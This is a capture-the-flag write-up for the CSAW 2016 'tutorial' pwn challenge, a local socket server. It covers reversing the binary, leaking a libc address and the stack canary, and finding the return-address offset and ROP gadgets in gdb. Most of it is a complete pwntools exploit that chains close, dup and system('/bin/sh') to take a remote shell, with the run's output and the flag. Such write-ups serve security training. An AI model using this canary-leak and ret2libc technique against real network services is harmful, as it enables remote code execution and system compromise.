Let's first take a look at the binary:
```
$	file tutorial 
tutorial: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=42229761fc55af0045343974220e812726cf904d, stripped
$	checksec tutorial 
[*] '/Hackery/ctf/csaw/pwn/tutorial/tutorial'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

So we can see that we are dealing with a 64 bit ELF, that has a stack canary and non executable stack. When we try to run the binary, we just get a Segmentation Fault. Let's take a loot at the code with IDA.

```
if ( fd == -1 )
  {
    perror("socket");
    exit(-1);
  }
  bzero(&s, 0x10uLL);
  if ( setsockopt(fd, 1, 2, &optval, 4u) == -1 )
  {
    perror("setsocket");
    exit(-1);
  }
  s = 2;
  v12 = htonl(0);
  v2 = atoi(*(const char **)(a2 + 8));
  v11 = htons(v2);
  if ( bind(fd, (const struct sockaddr *)&s, 0x10u) == -1 )
  {
    perror("bind");
    exit(-1);
  }
  if ( listen(fd, 20) == -1 )
  {
    perror("listen");
    exit(-1);
  }
```

So we can see here from the `sub_401087` function, the binary is trying to bind to a socket. let's try running the binary, but give it a port to listen on. Also in the `sub_400D7D` function you will see that it needs the user `tutorial` to be made along with a home directory for it.

```
$	./tutorial 44866
``` 

That should run the server. Now we can connect to it:

```
$	nc 127.0.0.1 44866
-Tutorial-
1.Manual
2.Practice
3.Quit
>1
Reference:0x7ffff7878190
-Tutorial-
1.Manual
2.Practice
3.Quit
>2
Time to test your exploit...
>swedwqedqwdq
swedwqedqwdq
i���gP���-Tutorial-
1.Manual
2.Practice
3.Quit
>3
You still did not solve my challenge.
```

So we see that we have three different options. Let's see what they do with IDA:

```
ssize_t __fastcall Menu(int argument)
{
  char buf; // [sp+10h] [bp-10h]@1

  while ( 1 )
  {
    while ( 1 )
    {
      write(argument, "-Tutorial-\n", 0xBuLL);
      write(argument, "1.Manual\n", 9uLL);
      write(argument, "2.Practice\n", 0xBuLL);
      write(argument, "3.Quit\n", 7uLL);
      write(argument, ">", 1uLL);
      read(argument, &buf, 2uLL);
      if ( buf != 50 )
        break;
      Vulnerable(argument);
    }
    if ( buf == 51 )
      break;
    if ( buf == 49 )
      Reference(argument);
    else
      write(argument, "unknown option.\n", 0x10uLL);
  }
  return write(argument, "You still did not solve my challenge.\n", 0x26uLL);
}
```

So we can see that if we choose either `Manual` or `Practice`, it executes a function. Let's see what `Manual` does (I renamed the Manual function to be reference, and the Practice function to be vulnerable):

```
__int64 __fastcall sub_400E62(int argument)
{
  void *puts_address; // ST18_8@1
  char buffer; // [sp+20h] [bp-40h]@1
  __int64 v4; // [sp+58h] [bp-8h]@1

  v4 = *MK_FP(__FS__, 40LL);
  puts_address = dlsym(0xFFFFFFFF, "puts");
  write(argument, "Reference:", 0xAuLL);
  sprintf(&buffer, "%p\n", puts_address - 1280);
  write(argument, &buffer, 0xFuLL);
  return *MK_FP(__FS__, 40LL) ^ v4;
}
```

So we can see here, that it is printing the address of `puts`, minus 1280. So with this leaked address, we can find the address of whatever we want in libc since that is what puts is from. Let's see what the `Practice` function is:

```
__int64 __fastcall sub_400EF2(int argument)
{
  char target_char; // [sp+10h] [bp-140h]@1
  __int64 v3; // [sp+148h] [bp-8h]@1

  v3 = *MK_FP(__FS__, 40LL);
  bzero(&target_char, 300uLL);
  write(argument, "Time to test your exploit...\n", 0x1DuLL);
  write(argument, ">", 1uLL);
  read(argument, &target_char, 460uLL);
  write(argument, &target_char, 324uLL);
  return *MK_FP(__FS__, 40LL) ^ v3;
}
```

So we can see that there is a buffer overflow vulnerabillity, with the `read` function reading in 460 bytes into the buffer at `rbp-140`. In addition to that we can see that the last write() function will print 324 bytes of data from the same buffer we overflow, which means it will print more than just the buffer. This could help us with leaking the Stack Canary, which we can find by looking at the assembly:
```
mov     rax, [rbp+var_8]
xor     rax, fs:28h
jz      short locret_400FA0
```

If this fails, it will go to `__stack_chk_fail` so it is obvious that this is the stack canary check. We can see that the stack canary is at `rbp+8`, which is within the range of the last write call. 

So now we can just select the `Practice` options once, grab and parse out the stack canary, and then place it back when we do a buffer overflow and it should pass the check. The stack canary at `rbp-0x8` should be 312 bytes away from the start of our input at `rbp-0x140` since `0x140 - 0x8 = 312`. Here is the python code I used to do that.

```
#Import pwntools
from pwn import *

#Setup the remote connection
target = remote('127.0.0.1', 55555)

#Select the second option and send a newline character
print target.recvuntil("Quit")
target.sendline("2")
print target.recvuntil(">")
print target.recvline()
target.sendline("")
print target.recvline()

#Store the output
can = target.recvline()

#Filter out the stack canary (there are additional bytes around the canary we need to filter out) 
can = can.replace("-Tutorial-", "")
can = can.replace("\x00", "")
can = can[:7]
can = "\x00" + can
print len(can)

#Convert the canary to a human readable format and print them
read_can = hex(unpack(can, 64, endian='little', sign=False))
print read_can

#Select the second option again
print target.recvuntil("Quit")
target.sendline("2")
print target.recvuntil(">")
print target.recvline()

#Construct the payload and send it
payload = "0"*312 + can
target.sendline(payload)

#Drop to an interactive console
target.interactive()
```

Next we will find the offset between the start of our input, and the rip register which can be done in gdb:
gdb:
```
gdb-peda$ b *0x400f69
Breakpoint 1 at 0x400f69
gdb-peda$ r 44867
```

client:
```
nc 127.0.0.1 44868
-Tutorial-
1.Manual
2.Practice
3.Quit
>2
Time to test your exploit...
>
```

gdb:
```
Thread 2.1 "tutorial" hit Breakpoint 1, 0x0000000000400f69 in ?? ()
gdb-peda$ x/x $rbp-0x140
0x7fffffffe380:	0x0000000000000000
gdb-peda$ i f
Stack level 0, frame at 0x7fffffffe4d0:
 rip = 0x400f69; saved rip = 0x401053
 called by frame at 0x7fffffffe500
 Arglist at 0x7fffffffe368, args: 
 Locals at 0x7fffffffe368, Previous frame's sp is 0x7fffffffe4d0
 Saved registers:
  rbp at 0x7fffffffe4c0, rip at 0x7fffffffe4c8
```

python:
```
>>> 0x7fffffffe4c8 - 0x7fffffffe380
328
```

So we know we have 328 bytes worth of data before we reach the return address.

Now we will need the following things from libc: `close` `dup` `system` `string_of"/bin/sh"` (I'll explain why we need `dup` and `close` later). To do this, we can simply find the difference between there addresses and th eleaked address using gdb.

In gdb:
```
gdb-peda$ b write
Breakpoint 1 at 0x400ae0
gdb-peda$ r 44866
Starting program: /Hackery/ctf/csaw/pwn/tutorial/tutorial 44866
```

In another terminal:
```
$	nc 127.0.0.1 44866
```

In gdb:
```
Thread 2.1 "tutorial" hit Breakpoint 1, 0x0000000000400ef2 in ?? ()
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0x7ffff78516a0 <__libc_system>
gdb-peda$ p close
$2 = {<text variable, no debug info>} 0x7ffff7904f10 <close>
gdb-peda$ p dup
$3 = {<text variable, no debug info>} 0x7ffff7904f70 <dup>
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x7ffff7996c40 --> 0x68732f6e69622f ('/bin/sh')
gdb-peda$ c
```

Now keep in mind, since we set the breakpoing at `write`, each time the program tries to print something it will hit a breakpoint, so we will have to go into gdb and continue it each time it breaks. However on the client side you should end up with this:

```
-Tutorial-
1.Manual
2.Practice
3.Quit
>1
Reference:0x7ffff7878190
```

So we now have all of the addresses we need. Let's calculate the differences and write the code which will calculate all of the addresses for us.

python math:
```
>>> hex(0x7ffff78516a0 - 0x7ffff787c420)
'-0x2ad80'
>>> hex(0x7ffff7904f10 - 0x7ffff787c420)
'0x88af0'
>>> hex(0x7ffff7904f70 - 0x7ffff787c420)
'0x88b50'
>>> hex(0x7ffff7996c40 - 0x7ffff787c420)
'0x11a820'
```

python code:
```
#Import pwntools
from pwn import *

#Designate the libc elf and the remote connection
#elf = ELF("./tutorial")
libc = ELF("./libc-2.19.so")
target = remote('127.0.0.1', 55555)

#Choose the first option
print target.recvuntil('>')
target.sendline("1")

#Grab the input and parse out the address
leak = target.recvline().strip()
leak = int(leak.replace("Reference:", ""), 16)
print "leak: " + hex(leak)

#Calculate the other addresses from the leaked address
sys_adr = leak - 0x2ad80
clo_adr = leak + 0x88af0
dup_adr = leak + 0x88b50
bsh_adr = leak + 0x11a820

#Print the calculated addresses
print "sys: " + hex(sys_adr)
print "clo: " + hex(clo_adr)
print "dup: " + hex(dup_adr)
print "bsh: " + hex(bsh_adr)
```

Now that we have the stack canary, and the address, we need to find a ROP gadget that will pop the `rdi` register for us, so we can use it to pass arguments to functions. We can do this using ROPgadget.
```
$	python ROPgadget.py --binary tutorial | grep 'pop rdi'
0x00000000004012e3 : pop rdi ; ret
```
The last thing we will need for our exploit is knowing what socket to buind to. This program operates by listening with a parent process, and spawning a child process to deal with each connection. By default if we run the exploit which uses `system` to call "/bin/sh" the shell will use the 0 and 1 file descriptors of the parent process to run the shell, and we won't be able to use it. If we close those file descriptors and change the file descriptor using `dup` to the socket, then we will be able to use the shell. We can find the socket using gdb.

First we need to set a breakpoint for any point after the socket is created
```
gdb-peda$ b write
Breakpoint 1 at 0x400ae0
gdb-peda$ r 44866
```

Now we need to find which socket it uses

```
gdb-peda$ info proc
process 21431
warning: target file /proc/21431/cmdline contained unexpected null characters
cmdline = '/Hackery/ctf/csaw/pwn/tutorial/tutorial'
cwd = '/home/tutorial'
exe = '/Hackery/ctf/csaw/pwn/tutorial/tutorial'
gdb-peda$ shell ls -asl /proc/21431/fd
total 0
0 dr-x------ 2 root     root      0 Jun 28 10:59 .
0 dr-xr-xr-x 9 tutorial tutorial  0 Jun 28 10:00 ..
0 lrwx------ 1 root     root     64 Jun 28 10:59 0 -> /dev/pts/3
0 lrwx------ 1 root     root     64 Jun 28 10:59 1 -> /dev/pts/3
0 lrwx------ 1 root     root     64 Jun 28 10:59 2 -> /dev/pts/3
0 lrwx------ 1 root     root     64 Jun 28 10:59 4 -> socket:[328800]
```

So we can see that the socket it uses is `4`. Now we should be able to construct our exploit which will look like this. 

```
payload = "0"*312 + stack_canary + "0"*8 + rop_gadget + 0 + close + rop_gadget + 1 + close + rop + socket + dup + dup + rop + binsh + system
```

putting it all together we get this exploit:
```
#Import pwntools
from pwn import *

#Designate the libc elf and the remote connection
#elf = ELF("./tutorial")
libc = ELF("./libc-2.19.so")
target = remote('127.0.0.1', 44888)

#Choose the first option
print target.recvuntil('>')
target.sendline("1")

#Grab the input and parse out the address
leak = target.recvline().strip()
leak = int(leak.replace("Reference:", ""), 16)
print "leak: " + hex(leak)

#Calculate the other addresses from the leaked address
sys_adr = leak - 0x2ad80
clo_adr = leak + 0x88af0
dup_adr = leak + 0x88b50
bsh_adr = leak + 0x11a820

#Print the calculated addresses
print "sys: " + hex(sys_adr)
print "clo: " + hex(clo_adr)
print "dup: " + hex(dup_adr)
print "bsh: " + hex(bsh_adr) 

#Select the second option and send a newline character
print target.recvuntil("Quit")
target.sendline("2")
print target.recvuntil(">")
print target.recvline()
target.sendline("")
print target.recvline()

#Store the output
can = target.recvline()

#Filter out the stack canary
can = can.replace("-Tutorial-", "")
#can = can.replace("\x00", "")
can = can[-16:]
can0 = can[:len(can)/2]
can1 = can[len(can)/2:]
can = can[-13:]
can = can[:8]

#can = "\x00" + can
print len(can0)
print len(can1)

#Convert the canary to a human readable format and print them
read_can = hex(unpack(can, 64, endian='little', sign=False))
read_can0 = hex(unpack(can0, 64, endian='little', sign=False))
read_can1 = hex(unpack(can1, 64, endian='little', sign=False))
print "The stack canary is: " + read_can
print "The first canary is: " + read_can0
print "The second canary is: " + read_can1

#Select the second option again
print target.recvuntil("Quit")
target.sendline("2")
print target.recvuntil(">")
print target.recvline()

#Construct the payload and send it
rop = "\xe3\x12\x40\x00\x00\x00\x00\x00"
socket = "\x04\x00\x00\x00\x00\x00\x00\x00"
one = "\x01\x00\x00\x00\x00\x00\x00\x00"
zero = "\x00\x00\x00\x00\x00\x00\x00\x00"

#Construct the payload and send it
payload = "0"*312 + can + "0"*8 + rop + zero + p64(clo_adr) + rop + one + p64(clo_adr) + rop + socket + p64(dup_adr) + p64(dup_adr) + rop + p64(bsh_adr) + p64(sys_adr) #+ "\x00"
target.sendline(payload)

#Drop to an interactive console
target.interactive()

```

Now to run it:
```
$	python exploit.py 
[*] '/Hackery/ctf/csaw/pwn/tutorial/libc-2.19.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 127.0.0.1 on port 44888: Done
-Tutorial-
1.Manual
2.Practice
3.Quit
>
leak: 0x7ffff787c420
sys: 0x7ffff78516a0
clo: 0x7ffff7904f10
dup: 0x7ffff7904f70
bsh: 0x7ffff7996c40
-Tutorial-
1.Manual
2.Practice
3.Quit

>
Time to test your exploit...

>

8
8
The stack canary is: 0x5194f34205810800
The first canary is: 0x4205810800000000
The second canary is: 0xaffffe4a05194f3
1.Manual
2.Practice
3.Quit

>
Time to test your exploit...

[*] Switching to interactive mode
>000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\x0\x81\x05B��Q000ls
flag.txt
$ cat flag.txt
FLAG{3ASY_R0P_R0P_P0P_P0P_YUM_YUM_CHUM_CHUM}
```

Just like that, we pwned the binary! This writeups referenced these other writeups:

```
https://github.com/xPowerz/CTF-Writeups/tree/master/2016/CSAW/Tutorial
https://github.com/xPowerz/CTF-Writeups/tree/master/2016/CSAW/Tutorial
https://github.com/aweinstock314/aweinstock-ctf-writeups/tree/master/csaw_quals_2016/pwn200_tutorial
https://github.com/73696e65/ctf-notes/blob/master/2016-ctf.csaw.io/pwn-200-tutorial.md
https://github.com/ctfs/write-ups-2016/tree/master/csaw-ctf-2016-quals/pwn/tutorial-200
```